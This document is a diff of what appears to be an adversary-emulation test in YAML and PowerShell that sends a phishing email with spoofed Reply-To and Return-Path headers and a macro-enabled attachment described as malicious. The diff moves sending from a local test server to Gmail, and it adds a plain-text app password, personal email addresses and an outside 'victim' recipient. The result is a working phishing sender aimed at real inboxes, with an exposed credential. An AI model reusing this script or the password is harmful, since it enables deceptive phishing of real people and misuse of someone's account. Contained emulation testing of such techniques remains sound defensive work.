@@ -12,11 +12,15 @@ atomic_tests:
       smtp_server:
         description: SMTP server to use
         type: string
-        default: "localhost"  # Use localhost for testing (e.g., hMailServer or Postfix)
+        default: "smtp.gmail.com"  # Use Gmail's SMTP server
       smtp_port:
         description: SMTP port
         type: integer
-        default: 25  # Standard SMTP port for hMailServer
+        default: 587  # Standard port for Gmail with TLS
+      sender_email:
+        description: Real email address for SMTP authentication
+        type: string
+        default: "chaymaoumayma2003@gmail.com"  # Replace with your Gmail account
       sender_visible_email:
         description: Email address to spoof in the "From" header
         type: string
@@ -24,11 +28,15 @@ atomic_tests:
       reply_to_email:
         description: Reply-To email address
         type: string
-        default: "chaymaoumayma2003@gmail.com"  # Reply-to address matching Return-Path
+        default: "chaymaoumayma2003@gmail.com"  # Falsified Reply-To address
+      return_path:
+        description: Return-Path email address for spoofing
+        type: string
+        default: "chaymaoumayma2003@gmail.com"  # Falsified Return-Path
       recipient_email:
         description: Recipient email address
         type: string
-        default: "oumaymakabadou2@gmail.com"  # Replace with the actual recipient's email address
+        default: "victim2025@outlook.fr"  # Replace with the actual recipient's email address
       subject:
         description: Customized subject of the email
         type: string
@@ -45,7 +53,11 @@ atomic_tests:
       attachment_path:
         description: Path to the malicious attachment
         type: string
-        default: "C:\\temp\\PhishingAttachement.xlsm"  # Ensure this matches the actual path
+        default: "C:\\temp\\PhishingAttachment.xlsm"  # Ensure this matches the actual path
+      app_password:
+        description: Application password for SMTP authentication
+        type: string
+        default: "wbae yozc iyut rykk"  # Generated application password
       log_file:
         description: Path to the log file
         type: string
@@ -56,16 +68,19 @@ atomic_tests:
       command: |
         $smtpServer = "#{smtp_server}"
         $smtpPort = #{smtp_port}
+        $senderEmail = "#{sender_email}"  # Real address for SMTP authentication
         $senderVisibleEmail = "#{sender_visible_email}"  # Spoofed address visible in the "From" field
-        $replyToEmail = "#{reply_to_email}"  # Reply-To email address
+        $replyToEmail = "#{reply_to_email}"  # Falsified Reply-To address
+        $returnPath = "#{return_path}"  # Falsified Return-Path
         $recipientEmail = "#{recipient_email}"
         $subject = "#{subject}"
         $body = "#{body}"
         $attachmentPath = "#{attachment_path}"
+        $app_password = "#{app_password}"
 
         # Create a MailMessage object
         $mailMessage = New-Object System.Net.Mail.MailMessage
-        $mailMessage.From = New-Object System.Net.Mail.MailAddress("#{sender_visible_email}")  # Spoofed From address
+        $mailMessage.From = New-Object System.Net.Mail.MailAddress($senderEmail)  # Real address for authentication
         $mailMessage.To.Add($recipientEmail)
         $mailMessage.Subject = $subject
         $mailMessage.Body = $body
@@ -73,7 +88,7 @@ atomic_tests:
 
         # Add custom headers for spoofing
         $mailMessage.Headers.Add("Reply-To", $replyToEmail)
-        $mailMessage.Headers.Add("Return-Path", "#{reply_to_email}")  # Falsified Return-Path
+        $mailMessage.Headers.Add("Return-Path", $returnPath)  # Falsified Return-Path
         $mailMessage.Headers.Add("X-Priority", "1")
         $mailMessage.Headers.Add("X-MSMail-Priority", "High")
         $mailMessage.Headers.Add("Importance", "High")
@@ -89,7 +104,9 @@ atomic_tests:
 
         # Configure SMTP client
         $smtpClient = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort)
-        $smtpClient.EnableSsl = $false  # Disable SSL for local SMTP server
+        $smtpClient.EnableSsl = $true  # Enable SSL for Gmail
+        $securePassword = ConvertTo-SecureString "$app_password" -AsPlainText -Force
+        $smtpClient.Credentials = New-Object System.Management.Automation.PSCredential($senderEmail, $securePassword)
 
         # Send the email
         try {
